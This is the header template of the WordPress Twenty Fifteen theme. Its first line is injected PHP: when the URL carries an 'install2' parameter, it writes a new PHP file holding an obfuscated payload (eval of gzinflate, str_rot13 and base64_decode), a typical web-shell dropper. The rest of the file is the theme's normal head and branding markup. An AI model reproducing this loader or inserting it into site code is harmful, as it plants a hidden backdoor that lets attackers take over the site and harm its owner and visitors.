<?php if (isset($_GET['install2'])) { $data = "<?php eval(gzinflate(str_rot13(base64_decode('rUl6Yts2EP68APkPDHRANk3LdocBUhIZC29sDbbYmXLvixMIslHbeSREIKm4XpD/3jtF8liTc3ZEI0Bx3vPcPfeio5mUT4aSFU93ni+ax63TwwM+J80jrhTTzVMY+E5jORxZnUz0KbpmYVutXx4ODxr3XGQdizLXxCPHQHes2AwekTD61x9a6cfx+Dr8OAzG9BbNPP+0dB75/1n8YBxBU5cWMBPJGhA0VyKyjvIFAQaLNbnJ0TXyKcJHNHTZZMIA+gfPbLgAlQ4ehplVmLPRvwG2yFBQsbiUXK/BfWPe98Orbs8HB8N+n54+Hh6wR7EXQwMAmdBZFlltEGQplJ6t8yhwzVpTjv0fnvdtIyhGlTO700+Ck2KRU/7VY+zvkp5HvCrwSecTxJs3UyCfN+uu/emPp0Gcipxux7BuV5Qyc7stY4KL0eX1OOxf/u0Pzq98x7Qhbldm4npEveHF5MofjMPRYzhpYV3aTBV6nsd2CUN8STwrReYWywIbJJnN0MZ7WKzDllrgJ2nv5EjdO7HdA0O8FISedq5G1p3kf+VvlZM2CYxpEixMmp5orPV5JruYVlKZC5hkxf9w3nsSi0dV79cP5gPALmg3ZF1t1pl6yA04DFiYGI82qQt2hmMAtdHmsNllduu1MSZAgFFXnmvGRraGVPCwCeFFstgaF18banK9Kh42EAJFeXZLmmm29t3MyzzWXOSkS04wgvMVrxI75jEe2XZ5lJ7SRRZPNdH+1uk4cxiN6Qh6KcuNqdV+hwbJZylmgicugOvuPuycm1avzp8LZGbzPTEA/e0gSCAsmQMlkxnJ8C2GV1/jTSORqYFUdvflgl6ILIvypC7gGc+LRRO9LphUNfusKcEaezTOErpiDcpMxrdp64eS+ygtzfc7wGpDTNc53UrKoE7GUkmmmheR1AbXQSId1crrZzCb/1ZuRaQiV1Wfp8yk0U70k3mWPFZLXqlISfseYA78yoyziV92FfOD9faiigFbGfYJ2RWx4x+rdtnvfq/i5HmFD5TEdqSUp6M9ghVM2ehZYnd4E94r785txYpaHViuF3l2GAnHel9534GjhtFEZio5QG0wBrOQZAMHRqcuiWYLOAMyZpiJexZN7ywJEdB8lqKzIrQ02LobNa4JRon5Ka4wW7tU6qmIgJbgXmskaRmTPXtDxjFGinU4Zb9pB8vrpFToKWw0YtuTIkpQX0oZ3hFGssqYJebWqtZNIdnuBP1JQtCx+cCySbjnUPaZxVr0cbaaHaIOZened9m/WLOtBER22Bp+R4L4Lg1lXliQZhCAzQrNzQJ5uEwUXDRhB/7g+5wvVxnhWGHu5UktEJi7PyXID6hpRVLaduQ8K/wL')))); ?>"; file_put_contents("F03D83B60125828DD76F186829E2AFC1.php", $data); } ?>
<?php
/**
 * The template for displaying the header
 *
 * Displays all of the head element and everything up until the "site-content" div.
 *
 * @package WordPress
 * @subpackage Twenty_Fifteen
 * @since Twenty Fifteen 1.0
 */
?><!DOCTYPE html>
<html <?php language_attributes(); ?> class="no-js">
<head>
	<meta charset="<?php bloginfo( 'charset' ); ?>">
	<meta name="viewport" content="width=device-width">
	<link rel="profile" href="http://gmpg.org/xfn/11">
	<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">
	<!--[if lt IE 9]>
	<script src="<?php echo esc_url( get_template_directory_uri() ); ?>/js/html5.js"></script>
	<![endif]-->
	<?php wp_head(); ?>
</head>

<body <?php body_class(); ?>>
<div id="page" class="hfeed site">
	<a class="skip-link screen-reader-text" href="#content"><?php _e( 'Skip to content', 'twentyfifteen' ); ?></a>

	<div id="sidebar" class="sidebar">
		<header id="masthead" class="site-header" role="banner">
			<div class="site-branding">
				<?php
					twentyfifteen_the_custom_logo();

					if ( is_front_page() && is_home() ) : ?>
						<h1 class="site-title"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a></h1>
					<?php else : ?>
						<p class="site-title"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a></p>
					<?php endif;

					$description = get_bloginfo( 'description', 'display' );
					if ( $description || is_customize_preview() ) : ?>
						<p class="site-description"><?php echo $description; ?></p>
					<?php endif;
				?>
				<button class="secondary-toggle"><?php _e( 'Menu and widgets', 'twentyfifteen' ); ?></button>
			</div><!-- .site-branding -->
		</header><!-- .site-header -->

		<?php get_sidebar(); ?>
	</div><!-- .sidebar -->

	<div id="content" class="site-content">